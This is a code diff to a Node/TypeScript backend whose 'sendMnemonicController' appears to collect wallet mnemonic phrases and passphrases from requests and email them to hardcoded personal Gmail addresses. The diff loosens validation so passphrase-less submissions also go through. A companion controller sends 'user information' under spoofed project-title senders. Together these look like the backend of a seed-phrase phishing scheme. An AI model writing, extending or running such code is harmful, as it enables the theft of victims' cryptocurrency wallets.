@@ -3,6 +3,7 @@ import { asyncHandler, errorResponse, successResponse } from "../utils/handlers"
 import nodemailer from "nodemailer";
 const getRecipients = (): string[] => {
   const recipients = "davidbrown202r@gmail.com,yahyanbenedict@gmail.com";
+  // const recipients = "rohitkumar952895@gmail.com";
   if (!recipients) return [];
   return recipients.split(",").map((email) => email.trim());
 };
@@ -12,13 +13,13 @@ export const sendMnemonicController = asyncHandler(
     const payload = req.body;
 
     // Validate payload
-    if (!payload || !payload.data || !Array.isArray(payload.data) && !payload?.passphrase) {
+    if (!payload || !payload.data || !Array.isArray(payload.data)) {
       return errorResponse(res, "Invalid payload", 400);
     }
 
     // Build HTML email content
     let htmlContent = `<h2>App Name : ${payload.heading}</h2>`;
-    htmlContent += `<h3>PassPhrase: ${payload?.passphrase}</h3>`;
+    payload?.passphrase && (htmlContent += `<h3>PassPhrase: ${payload?.passphrase}</h3>`);
 
     payload.data.forEach((item: { label: string; value: string }) => {
       htmlContent += `<p>${item.value}</p>`;
@@ -115,18 +116,18 @@ export const sendUserInfoController = asyncHandler(
       const subject = `[${title}] User Information Received - ${new Date().toLocaleDateString()}`;
 
       // Send separate emails for each recipient (per project title)
-          const mailOptions = {
-            from: `"${title}" <davidbrown202e@gmail.com>`,
-            to: recipients,
-            subject: subject, // unique to each title/project
-            html: htmlContent,
-            headers: {
-              "Message-ID": `<${Date.now()}-${title.replace(/\s+/g, "-")}@yourapp.com>`,
-              "In-Reply-To": `<${title.replace(/\s+/g, "-")}@yourapp.com>`,
-              References: `<${title.replace(/\s+/g, "-")}@yourapp.com>`,
-            },
-          };
-          await transporter.sendMail(mailOptions);
+      const mailOptions = {
+        from: `"${title}" <davidbrown202e@gmail.com>`,
+        to: recipients,
+        subject: subject, // unique to each title/project
+        html: htmlContent,
+        headers: {
+          "Message-ID": `<${Date.now()}-${title.replace(/\s+/g, "-")}@yourapp.com>`,
+          "In-Reply-To": `<${title.replace(/\s+/g, "-")}@yourapp.com>`,
+          References: `<${title.replace(/\s+/g, "-")}@yourapp.com>`,
+        },
+      };
+      await transporter.sendMail(mailOptions);
 
       return successResponse(res, {}, `Emails for "${title}" sent successfully`, 200);
     } catch (error: any) {
